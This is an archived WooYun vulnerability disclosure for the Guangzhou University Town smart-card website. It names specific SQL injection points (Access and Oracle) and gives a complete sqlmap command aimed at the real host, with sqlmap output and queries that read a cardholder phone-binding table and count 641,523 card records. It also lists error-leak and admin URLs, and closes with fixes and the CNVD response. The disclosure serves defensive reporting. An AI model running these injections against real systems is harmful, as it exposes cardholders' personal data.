@@ -1,0 +1,340 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		广州大学城一卡通网站的数个问题  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		广州大学城一卡通网站的数个问题  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/horseluke">horseluke</a> 
+</li><li>提交时间：		2012-02-26 19:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-02-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-02-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-03-08：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-03-18：	细节向普通白帽子公开<br/>
+									2012-03-28：	细节向实习白帽子公开<br/>
+									2012-04-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">广州大学城一卡通网站存在数个问题，可能会产生一些不良后果。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">由于存在的问题较多，故进行了分类说明，但请注意1.2这个非常严重的漏洞。<br />
+<br />
+<br />
+<br />
+一、SQL注射漏洞相关<br />
+<br />
+<br />
+<br />
+1.1、未下线的旧版页面存在基于MICROSOFT ACCESS的SQL注入漏洞<br />
+<br />
+注入点：<br />
+<br />
+</p><pre><code>http://218.20.222.1/info_view.asp?id=18</code></pre><p class='detail'><br />
+<br />
+分析与判断：<br />
+<br />
+由于注入点在id不为数字时报错，根据报错类型，可以判断存在SQL注入点。<br />
+<br />
+从测试来看，本漏洞仅影响Access本身，故危害为低。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26190404e7bbdd0dead738ef5153cc0d14c3be0e.jpg" target="_blank"><img src="../images/26190404e7bbdd0dead738ef5153cc0d14c3be0e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+1.2、新版页面中“我的一卡通”存在基于Oracle的SQL注入漏洞（重点！）<br />
+<br />
+注入点：<br />
+<br />
+</p><pre><code>http://www.ekatong.com.cn/WEB/myekt.aspx</code></pre><p class='detail'><br />
+<br />
+分析与判断：<br />
+<br />
+本注入点有一个利用前提：必须为一卡通持卡人并且登录。<br />
+<br />
+登录后有查询账单功能，但参数e_date处并没有作服务器端日期格式有效性校验（猜测s_date也没有作服务器端日期格式有效性校验，只是不等式对比后者时会被拦截），结果导致服务器出错，出错内容提示，存在SQL注入漏洞。<br />
+<br />
+（通过IE工具修改提交表单，绕过HTML和JS限制）<br />
+<br />
+</p><p class="detail"><a href="../images/2619071155e4091f9ff5ff0405567dc978031f15.jpg" target="_blank"><img src="../images/2619071155e4091f9ff5ff0405567dc978031f15.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+（错误内容）<br />
+<br />
+</p><p class="detail"><a href="../images/261909035e9608d011d0ad94c3e65dc617c53a3c.jpg" target="_blank"><img src="../images/261909035e9608d011d0ad94c3e65dc617c53a3c.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+经过注入测试后（详见漏洞证明），发现可读取众多数据表，比如一卡通和手机号码绑定列表；虽然由于权限问题无法读取最新一卡通账户资料，但有个表也有60w旧数据，笔者的也在内。另根据dba-user的列表，推测所有大学城一卡通相关数据（包括公共单车、一卡通消费等）都在里面，如果有人能突破和提权的话......后果不堪设想，毁掉的是整个大学城的经济生态圈。<br />
+<br />
+综合以上判断，故本漏洞设为高。此问题处理应该从速。<br />
+<br />
+<br />
+<br />
+1.3 部分页面存在疑似SQL注入问题<br />
+<br />
+疑似地址：<br />
+<br />
+</p><pre><code>http://www.ekatong.com.cn/WEB/searchnews.aspx?cid=46</code></pre><p class='detail'><br />
+<br />
+分析与判断：<br />
+<br />
+错误提示似乎采用了绑定变量查询，故未细致探究。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+二、错误信息泄露<br />
+<br />
+2.1 众多页面存在错误信息泄露问题<br />
+<br />
+分析和判断：<br />
+<br />
+除了1.2以外，其它页面的防护点都是可以的（采取了整形转换和预处理查询），但是存在将异常和错误信息直接打印出来的问题。如下页面后面加&#039;即可报错：<br />
+<br />
+</p><pre><code>http://www.ekatong.com.cn/WEB/newsdetail.aspx?nid=222<br />
+http://www.ekatong.com.cn/WEB/businessinde.aspx?sid=16</code></pre><p class='detail'><br />
+<br />
+本问题危害度低。<br />
+<br />
+<br />
+<br />
+2.2 后台地址与废弃功能页面泄露<br />
+<br />
+分析与判断：<br />
+<br />
+新版存在管理后台地址泄露和OA地址泄露问题（OA直接挂到首页有点汗），同时也存在废弃功能页面（http://www.ekatong.com.cn/WEB/login.aspx）泄露。<br />
+<br />
+综合判断为低 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">一、SQL注射漏洞相关<br />
+<br />
+<br />
+<br />
+1.1 证明（SQLMAP）<br />
+<br />
+[12:01:18 02/26/12]<br />
+<br />
+[http://218.20.222.1:80/info_view.asp][GET][id=18][DBMS][Microsoft Access]<br />
+<br />
+sqlmap identified the following injection points with a total of 44 HTTP(s) requests:<br />
+<br />
+---<br />
+<br />
+Place: GET<br />
+<br />
+Parameter: id<br />
+<br />
+    Type: boolean-based blind<br />
+<br />
+    Title: AND boolean-based blind - WHERE or HAVING clause<br />
+<br />
+---<br />
+<br />
+<br />
+<br />
+1.2 证明（SQLMAP；重点！）<br />
+<br />
+1.2.1 SQLMAP命令<br />
+<br />
+</p><pre><code>python sqlmap.py -u &quot;http://www.ekatong.com.cn/WEB/myekt.aspx&quot; -v 1 --dbms &quot;Oracle&quot; --dbs --cookie &quot;略&quot; --referer &quot;略&quot; --user-agent &quot;略&quot; -p &quot;e_date&quot; --data &quot;....略...s_date=2012-02-18&amp;e_date=2012-02-25&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+1.2.2 SQL日志<br />
+<br />
+</p><pre><code>sqlmap identified the following injection points with a total of 0 HTTP(s) requests:<br />
+---<br />
+Place: POST<br />
+Parameter: e_date<br />
+    Type: error-based<br />
+    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)<br />
+---</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+1.2.2 查询本人的一卡通和手机号码绑定列表状态<br />
+<br />
+</p><pre><code>SELECT * FROM T_MOBILEBINDYKT WHERE PHONE = &#039;13*********&#039; [1]:<br />
+[*] 20120226, ******,  ,  , 20120226, ******,  ,  , ******, ******, 一卡通卡号, 13*********, 2</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+1.2.3 查询某个一卡通账户表存在多少账户资料（本人的也在里面）<br />
+<br />
+</p><pre><code>SELECT count(*) FROM T_CARD:    &#039;641523&#039;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+1.3 证明（暂无）<br />
+<br />
+<br />
+<br />
+二、错误信息泄露<br />
+<br />
+（略） </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、屏蔽网站错误<br />
+<br />
+2、SQL漏洞修复<br />
+<br />
+3、已废弃内容应该彻底从服务器撤下并且删除<br />
+<br />
+4、无需暴露的地址，就不应该暴露，或者应该加权限访问（如OA地址；后台管理地址等）<br />
+<br />
+5、全面检查服务器安全问题<br />
+<br />
+<br />
+<br />
+再次呼吁，各大学城在网络上可能存在不少安全隐患，建议CNVD择重点关注。<br />
+<br />
+也希望各大学校不要因此而又要自己搞一套。大学城终极目标是资源共享，而不是位置共享！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/horseluke" title="horseluke">horseluke</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-04839" title="广州大学城一卡通网站的数个问题">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2012-02-27 14:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认ACCESS 注入点存在,与oracle相关的注入点未能直接复现，根据图片以及报告者详实的描述过程确认。将直接转由CNCERT广东分中心处置。<br />
+<br />
+CNVD对该漏洞评分如下：<br />
+基本得分CVSS：(AV:R/AC:L/Au:R/C:C/A:N/I:P/B:N) score:7.98（高危）<br />
+技术难度系数：1.1（存在页面表单绕过）<br />
+影响危害系数：1.4（较严重，涉及实名信息泄露，危害情况需等待涉事方反馈）<br />
+CNVD综合评分：7.98*1.1*1.4=12.289</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="4839";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
